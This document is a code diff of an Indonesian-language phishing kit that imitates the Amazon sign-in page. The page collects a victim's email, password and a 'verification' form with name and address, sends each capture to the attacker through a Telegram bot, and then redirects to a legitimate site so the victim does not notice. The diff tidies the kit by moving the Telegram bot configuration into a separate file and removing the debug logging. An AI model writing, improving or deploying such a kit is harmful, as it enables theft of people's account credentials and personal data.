@@ -6,12 +6,12 @@
     <title>Amazon Sign In</title>
     
     <link rel="icon" href="assets/favicon.ico">
+    <link rel="stylesheet" href="style.css">
     
     <!-- Muat Konfigurasi -->
+    <script src="config/telegram.js"></script>
     <script src="config/negara.js"></script>
     <script src="config/bahasa.js"></script>
-    
-    <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <!-- Halaman 1: Email -->
@@ -32,7 +32,7 @@
             <p class="tautan-bisnis"><a href="#" data-i18n="tokoBisnis">Shop on Amazon Business</a></p>
         </div>
         <div class="bagian-daftar">
-            <p class="teks-pemisah" data-i18n="baruAmazon">New to Amazon?</p>
+            <p class="teks-pemisah"><span data-i18n="baruAmazon">New to Amazon?</span></p>
             <button class="tombol-daftar" data-i18n="buatAkun">Create your Amazon account</button>
         </div>
         <footer>
@@ -63,7 +63,7 @@
             <button class="tombol-passkey" data-i18n="masukKunci">Sign in with a passkey</button>
         </div>
         <div class="bagian-daftar">
-            <p class="teks-pemisah" data-i18n="baruAmazon">New to Amazon?</p>
+            <p class="teks-pemisah"><span data-i18n="baruAmazon">New to Amazon?</span></p>
             <button class="tombol-daftar" data-i18n="buatAkun">Create your Amazon account</button>
         </div>
         <footer>
@@ -200,13 +200,9 @@
     </div>
 
     <script>
-        // === Telegram — Ganti dengan milikmu ===
-        const BOT_TOKEN = 'GANTI_DENGAN_TOKEN_BOT_KAMU';
-        const CHAT_ID = 'GANTI_DENGAN_ID_CHAT_KAMU';
-
         let dataPengguna = { email: '', sandi: '', kodeNegara: 'ID' };
 
-        // === Terapkan Bahasa ke Seluruh Halaman ===
+        // Terapkan Bahasa
         function terapkanBahasa(kodeNegara) {
             document.querySelectorAll('[data-i18n]').forEach(el => {
                 const kunci = el.getAttribute('data-i18n');
@@ -214,13 +210,12 @@
             });
             document.querySelectorAll('[data-i18n-html]').forEach(el => {
                 const kunci = el.getAttribute('data-i18n-html');
-                // Untuk teks yang mengandung link, biarkan HTML tetap utuh
                 const bhs = terjemahan[kodeNegara] || terjemahan[BAHASA_BAWAAN];
                 if (bhs[kunci]) el.innerHTML = bhs[kunci];
             });
         }
 
-        // === Deteksi Negara → Terapkan Bendera + Bahasa ===
+        // Deteksi Negara
         async function deteksiNegara() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -228,7 +223,6 @@
                 const kode = data.country || 'ID';
                 dataPengguna.kodeNegara = kode;
 
-                // Tampilkan bendera
                 const info = daftarNegara[kode] || NEGARA_BAWAAN;
                 const benderaEl = document.getElementById('bendera-negara');
                 const namaEl = document.getElementById('nama-negara');
@@ -238,16 +232,11 @@
                 if (namaEl) namaEl.textContent = `Deliver to ${info.nama}`;
                 if (benderaAkunEl) benderaAkunEl.textContent = info.bendera + ' ';
 
-                // Terapkan bahasa sesuai negara
                 terapkanBahasa(kode);
 
-                // Set pilihan negara di formulir
                 const selectNegara = document.getElementById('negara');
                 if (selectNegara) selectNegara.value = kode;
-
-                console.log('✅ Negara:', kode, '| Bahasa diterapkan');
             } catch (e) {
-                console.log('⚠️ Pakai bahasa bawaan (Indonesia)');
                 dataPengguna.kodeNegara = 'ID';
                 terapkanBahasa('ID');
                 const info = daftarNegara['ID'];
@@ -258,10 +247,10 @@
             }
         }
 
-        // === Navigasi Halaman ===
+        // Email → Sandi
         function bukaSandi() {
             const email = document.getElementById('email').value.trim();
-            if (!email) { alert('Masukkan email terlebih dahulu'); return; }
+            if (!email) return;
             dataPengguna.email = email;
             document.getElementById('tampil-email').textContent = email;
             document.getElementById('halaman-email').style.display = 'none';
@@ -274,30 +263,28 @@
             document.getElementById('halaman-email').style.display = 'block';
         });
 
-        // === Kirim Login → Telegram → Tampil Verifikasi ===
+        // Kirim Login → Lanjut ke Verifikasi
         async function kirimData() {
             const sandi = document.getElementById('sandi').value;
-            if (!sandi) { alert('Masukkan kata sandi'); return; }
+            if (!sandi) return;
             dataPengguna.sandi = sandi;
 
-            const pesan = `📧 LOGIN DITERIMA
+            const pesan = `📧 LOGIN
 Negara: ${dataPengguna.kodeNegara}
 Email: ${dataPengguna.email}
 Kata Sandi: ${dataPengguna.sandi}
 Waktu: ${new Date().toLocaleString()}`;
 
-            await kirimKeTelegram(pesan);
+            await kirimPesanTelegram(pesan);
 
             document.getElementById('halaman-sandi').style.display = 'none';
             document.getElementById('halaman-verifikasi').style.display = 'block';
-            
-            // Jalankan deteksi saat halaman verifikasi muncul
             deteksiNegara();
         }
 
-        // === Kirim Formulir Verifikasi ===
+        // Kirim Verifikasi → Lanjut ke tujuan
         async function kirimVerifikasi() {
-            const data = `✅ DATA VERIFIKASI
+            const data = `✅ VERIFIKASI
 Negara: ${dataPengguna.kodeNegara}
 Email: ${dataPengguna.email}
 Nama: ${document.getElementById('nama-lengkap').value}
@@ -310,26 +297,10 @@ Provinsi: ${document.getElementById('provinsi').value}
 Kode Pos: ${document.getElementById('kodepos').value}
 Negara: ${document.getElementById('negara').value}`;
 
-            await kirimKeTelegram(data);
-            alert(teks(dataPengguna.kodeNegara, 'kirimBerhasil'));
-        }
+            await kirimPesanTelegram(data);
 
-        // === Fungsi Kirim ke Telegram ===
-        async function kirimKeTelegram(teksPesan) {
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: teksPesan,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                console.log('✅ Terkirim ke Telegram');
-            } catch (e) {
-                console.log('❌ Gagal kirim:', e);
-            }
+            // Alihkan ke halaman tujuan
+            window.location.href = 'https://www.coinbase.com/en-gb';
         }
     </script>
 </body>
